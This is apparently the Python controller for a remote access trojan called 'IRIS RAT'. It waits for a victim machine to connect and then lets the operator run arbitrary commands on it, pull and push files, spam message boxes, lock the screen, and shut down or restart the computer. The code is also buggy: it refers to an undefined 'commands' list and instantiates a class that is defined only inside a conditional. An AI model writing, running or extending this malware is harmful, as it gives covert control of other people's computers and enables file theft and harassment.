from colorama import init, Fore, Back, Style
import socket
import json 
import base64 
import colorama
import sys, os, time, platform, psutil, random, string, ctypes
from os import system, name

ctypes.windll.kernel32.SetConsoleTitleW("IRIS RAT BY SIR!")

def help_command():
    total = 0
    print("\nCommands: \n")
    # Simple loop to send a description of all commands
    for x in commands:
        print(f"[{total}] {commands[total][0]} - {commands[total][1]}")
        total += 1
    print("[∞] Anything will run on command prompt\n")

colorama.init()
IRIS = """
██╗██████╗ ██╗███████╗    ██████╗  █████╗ ████████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██║██╔══██╗██║██╔════╝    ██╔══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║██████╔╝██║███████╗    ██████╔╝███████║   ██║       ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║██╔══██╗██║╚════██║    ██╔══██╗██╔══██║   ██║       ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██║██║  ██║██║███████║    ██║  ██║██║  ██║   ██║       ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                        made by SIR!
                  |════════════════════>ALL FUNCTIONS<════════════════════|
══════════════════>[exit] Exits the connection on both sides
══════════════════>[cd] Changes the active directory
══════════════════>[download] Downloads files from the client
══════════════════>[upload] Uploads files from the server to the client
══════════════════>[message] Shows a message box on the client users screen
══════════════════>[messagebomb] Shows one message box after the other 100 times on the client users screen
══════════════════>[lock] Puts the client user back to the login screen
══════════════════>[shutdown] Shutsdown the client users PC, will close connection
══════════════════>[restart] Restarts the client users PC
══════════════════>[ratHelp] Displays this list
"""
print(colorama.Fore.RED + IRIS)

text = input("start the server?(Y/N)")
if text == "Y" or text == "y":
 class Server:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print(colorama.Fore.RED)
        print("[+] Waiting for a connection")
        print(colorama.Style.RESET_ALL)
        self.connection, address = server.accept()
        print(colorama.Fore.GREEN)
        print("[+] Connection received from: " + str(address))
        self.username = self.data_receive()
        print(colorama.Style.RESET_ALL)
        help_command()

    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    def execute_remotely(self, command):
        self.data_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.data_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete"

    def handle_result(self, result):
        if "[-]" in result:
            return f"{colorama.Fore.RED}{result}{colorama.Style.RESET_ALL}"
        elif "[+]" in result:
            return f"{colorama.Fore.GREEN}{result}{colorama.Style.RESET_ALL}"
        else:
            return result

    def run(self):
        while True:
            command = input(
                f"{colorama.Fore.CYAN + self.username}@{colorama.Fore.RED + socket.gethostname()}{colorama.Style.RESET_ALL}: "
            )
            command = command.split(" ", 1)
            try:
                if command[0] == "upload":
                    fileContent = self.read_file(command[1]).decode()
                    command.append(fileContent)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
                elif command[0] == "ratHelp":
                    help_command()
            except Exception:
                result = "[-] Error running command, check the syntax of the command."
            print(self.handle_result(result))

activeServer = Server("127.0.0.1", 7976)
activeServer.run()

